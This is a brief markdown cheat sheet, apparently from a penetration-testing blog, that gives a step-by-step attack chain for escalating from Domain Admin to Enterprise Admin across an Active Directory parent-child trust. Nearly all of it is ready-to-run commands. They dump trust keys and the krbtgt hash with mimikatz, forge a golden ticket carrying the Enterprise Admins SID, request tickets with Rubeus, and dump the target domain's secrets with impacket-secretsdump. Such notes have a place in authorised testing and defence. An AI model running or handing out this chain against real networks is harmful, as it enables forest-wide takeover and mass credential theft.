---
title: "Abuse Parent Child Domain Trusts"
date: 2024-7-2
tags: ["kerberos", "da", "ea", "active directory", "ad", "domain controller", "Windows", "golden ticket", "privesc", "mimikatz", "rubeus", "trusts"]
---

---
### Privesc from DA (Domain Admin) to EA (Enterprise Admin)

#### 1. Check trust relationships

```powershell
# Get all trusted domain objects in a forest
Get-ADTrust -Filter *
```

```powershell
# Returns a list of trusted domains
nltest /domain_trusts
```

```powershell
# Gets a collection of the trust relationships of the current forest
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
```

#### 2. Get current and target domain SID

```powershell
./mimikatz.exe 'lsadump::trust' 'exit'
```

#### 3. Get krbtgt hash of current domain

```powershell
./mimikatz.exe 'lsadump::dcsync /all /csv' 'exit'
```

#### 4. Forge a golden ticket

```powershell
# Append '-519' to target domain SID
./mimikatz.exe 'kerberos::golden /user:Administrator /rc4:<HASH> /domain:<CURRENT_DOMAIN> /sid:<CURRENT_DOMAIN_SID> /sids:<TARGET_DOMAIN_SID>-519 /ticket:C:\ProgramData\ticket.kirbi' 'exit'
```

<small>*Note: Try different high value hashes if failed*</small>

#### 5. Request a tgt ticket of target domain

```powershell
./rubeus.exe asktgs /service:cifs/<TARGET_DOMAIN> /domain:<DOMAIN> /dc:<DC> /ticket:C:\ProgramData\ticket.kirbi /outfile:C:\ProgramData\ticket_2.kirbi /nowrap
```

#### 6. Convert kirbi to ccache (Back to Linux)

[RubeusToCcache](https://github.com/SolomonSklash/RubeusToCcache)

```bash
python3 rubeustoccache.py <BASE64_TICKET_2> secrets.kirbi secrets.ccache
```

#### 7. Secrets Dump

```bash
export KRB5CCNAME=secrets.ccache
```

```bash
impacket-secretsdump administrator@<TARGET_DOMAIN> -k -no-pass
```

<br>